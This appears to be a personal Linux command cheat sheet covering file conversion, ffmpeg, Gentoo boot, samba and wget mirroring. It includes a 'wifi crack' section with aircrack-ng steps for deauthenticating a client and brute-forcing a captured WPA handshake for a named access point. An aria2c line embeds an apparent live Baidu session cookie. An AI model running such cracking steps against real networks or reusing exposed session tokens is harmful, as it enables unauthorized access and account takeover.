# unzip luanma
unzip -O cp936 $zipfile
#efi gentoo
efibootmgr -c -d /dev/sda -p 2 -L "Gentoo" -l "\efi\boot\grubx64.efi"

#
you-get -o /home/xwga/Downloads/douyu/ -O "$(date +'%G%m%d_%H%M_%S')".flv https://www.douyu.com/2447633

# replace a newline (\n) using sed
sed ':a;N;$!ba;s/\n/ /g' file
# OSX
sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' file
#Use tr instead?
tr '\n' ' ' < input_filename
#or remove the newline characters entirely:
tr -d '\n' < input.txt > output.txt
#or if you have the GNU version (with its long options)
tr --delete '\n' < input.txt > output.txt

# remove empty line
cat 3390.txt | sed '/^\s*$/d' > 3.txt


# /etc/fstab
/dev/sda3       /home/xwga/Downloads  ntfs-3g    uid=xwga,gid=users,dmask=077,fmask=177,utf8    0 0

# virtualbox
modules="vboxdrv vboxnetadp vboxnetflt vboxpci"
gpasswd -a <user> vboxusers

# create trash
#cd $root
sudo mkdir -p .Trash-1000/{expunged,files,info}
sudo chown -Rv $USER .Trash-1000

# unzip
LANG=C 7za x your-zip-file.zip
convmv -f GBK -t utf8 --notest -r .

# batch rename
i=10000; for f in *.png; do mv "$f" img_${i#1}.png; ((i++)); done
i=0; for img in `ls *.png`; do mv $img test-`printf  %.6d $i`.png; i=`expr $i + 1`; done
find ./ -name '*.png' | while read FILE; do   mv "$FILE" test-`printf  %.6d $i`.png; i=`expr $i + 1`; done

# 7z encode file name
for i in * ; do  7z a -mhe -r -pPASSWD ${i%.*}.7z $i ; done

# wifi
sudo wpa_supplicant -Dnl80211 -iwlp8s0b1 -C/var/run/wpa_supplicant/ -c/etc/wpa_supplicant/wpa_supplicant.conf -dd

# samba
sudo systemctl enable smbd.service
sudo systemctl start smbd.service
sudo pdbedit -a e788b1

# xml
cat * | ag img | sed 's/\"/\n/g' | ag http | ag uniq

# firefox
mousewheel.acceleration.factor;13
mousewheel.acceleration.start;0

# ffmeg flv > mp4
ffmpeg -i filename.flv -c:v libx264 -crf 19 -strict experimental filename.mp4
for file in *.flv ; do ffmpeg -i "$file" -codec copy "${file%.*}.mp4" ;done

ffmpeg -i "$(you-get -u http://www.iqiyi.com/v_19rrne7134.html | grep http://)" -c copy -f mp4 -bsf:a aac_adtstoasc output.mp4

# find mv
find . -print0 | while read -d $'\0' file; do mv -bv "$file" /tmp; done

# disable ipv6
/etc/sysctl.d/disable-ipv6.conf
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1

/etc/default/grub
GRUB_CMDLINE_LINUX="ipv6.disable=1 quiet splash"
sudo grub2-mkconfig -o /boot/grub/grub.cfg

#WGET
wget -nd -r -l 2 -A jpg,jpeg,png,gif http://t.co
-nd: no directories (save all files to the current directory; -P directory changes the target directory)
-r -l 2: recursive level 2
-A: accepted extensions
wget -nd -H -p -A jpg,jpeg,png,gif -e robots=off example.tumblr.com/page/{1..2}
-H: span hosts (wget doesn't download files from different domains or subdomains by default)
-p: page requisites (includes resources like images on each page)
-e robots=off: execute command robotos=off as if it was part of .wgetrc file. This turns off the robot exclusion which means you ignore robots.txt and the robot meta tags (you should know the implications this comes with, take care).

# wifi crack
sudo airmon-ng start wlp8s0b1
sudo airodump-ng wlp8s0b1mon
sudo airodump-ng  -c 4  -w psk wlp8s0b1mon --bssid A8:57:4E:85:65:1A
sudo aireplay-ng  -0 2 -a A8:57:4E:85:65:1A -c 80:E6:50:8A:A3:E3 wlp8s0b1mon
-e bssid --ignore-negative-on
aircrack-ng  -w passwd.txt psk-*.cap -b A8:57:4E:85:65:1A

#concatenate videos with ffmpeg
ffmpeg -f concat -i <(for f in ./*.wav; do echo "file '$PWD/$f'"; done) -c copy output.wav
ffmpeg -f concat -i <(printf "file '$PWD/%s'\n" ./*.wav) -c copy output.wav
ffmpeg -f concat -i <(find . -name '*.wav' -printf "file '$PWD/%p'\n") -c copy output.wav

# create trash
cd disk
sudo mkdir -p .Trash-1000/{files,info}
sudo chown -R e788b1:users .Trash-1000
sudo chmod 700 .Trash-1000

# ssh
ls -al ~/.ssh
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"



#apack all folder to zip
for i in *; do apack ../"$i".zip "$i"; done

#loop
find -type f -print0 | while read -r -d '' file;read -r -d '' file; do  [[ 720 -gt `identify -format '%w' "$file"` ]] && gvfs-trash "$file" ;done

time find  -type f  | while read -r file ;do [[ 720 -gt `identify -format '%w' "$file"` ]] && gvfs-trash "$file" ; done

# word sort
tr ' ' '\n' <<< "zebra ant spider spider ant zebra ant" | sort -u | tr '\n' ' '

# VBoxManage
VBoxManage setextradata "Android2.3" "CustomVideoMode3" "480x720x16"
VBoxManage setextradata global GUI/Customizations noMenuBar,noStatusBar

# set fbterm
sudo setcap 'cap_sys_tty_config+ep' /usr/bin/fbterm

# test color
(x=`tput op` y=`printf %76s`;for i in {0..256};do o=00$i;echo -e ${o:${#o}-3:3} `tput setaf $i;tput setab $i`${y// /=}$x;done)

echo -e "\e[3$(( $RANDOM * 6 / 32767 + 1 ))mHello World."

# backup system with rsync
rsync -aAXv --exclude={"/dev/*","/proc/*","/sys/*","/tmp/*","/run/*","/mnt/*","/media/*","/lost+found","/home/*","/usr/portage/*"} / /mnt

# add local CA
mkdir -p /usr/local/share/ca-certificates/
cp path/to/my.crt /usr/local/share/ca-certificates/
update-ca-certificates
#emerge -1 app-misc/ca-certificates

# auto login
c1:12345:respawn:/sbin/agetty -a e788b1 --noclear 38400 tty1 linux

# xrandr
xrandr --newmode "1920x1080"  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync
xrandr --addmode VGA-0 1920x1080
xrandr --output VGA-0 --mode 1920x1080

aria2c -c -s10 -k1M -x10 -o "name.ext" --header "User-Agent: netdisk;5.2.7;PC;PC-Windows;6.2.9200;WindowsBaiduYunGuanJia" --header "Cookie: BDUSS=204T1JOT2p0Ymo5anM5dnZFbld6YmNoeE5tbktUd1RJUVk5VkFRYzJSOU41OGhWQVFBQUFBJCQAAAAAAAAAAAEAAACT9HQrRTc4OEIxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE1aoVVNWqFVR;pcsett=1437299851-96619538eef87eaf159b137445fdc813" --header "Referer: http://pan.baidu.com/disk/home" "http://d.pcs.baidu.com/file/2a13edab1d5364a7fb2a36fd1d23389d?fid=4096777643-250528-437920137243153&time=1437213474&rt=pr&sign=FDTAER-DCb740ccc5511e5e8fedcff06b081203-z7KQoKGCbdABj6tK45wiC%2fFyY2k%3d&expires=8h&prisign=unknow&chkbd=0&chkv=0&r=987840554"
ffmpeg -f concat -i mylist.txt -c copy output
ffmpeg -f alsa -i default -f v4l2 -s 640x480 -i /dev/video0 -acodec flac -vcodec libx264 output.mkv

ffmpeg -i input.avi -c:v libx264 -crf 19 -preset slow -c:a aac -strict experimental -b:a 192k -ac 2 out.mp4
ffmpeg -i input.avi -c:v libx264 -crf 19 -preset slow -c:a libfaac -b:a 192k -ac 2 out.mp4
ffmpeg -i video -c:v libx264 -crf 18 -preset slow -pix_fmt yuv420p -c:a copy output.mkv

mkvextract tracks a.mkv 2:a.ass

# ublock
http://git.oschina.net/halflife/list/raw/master/ad.txt
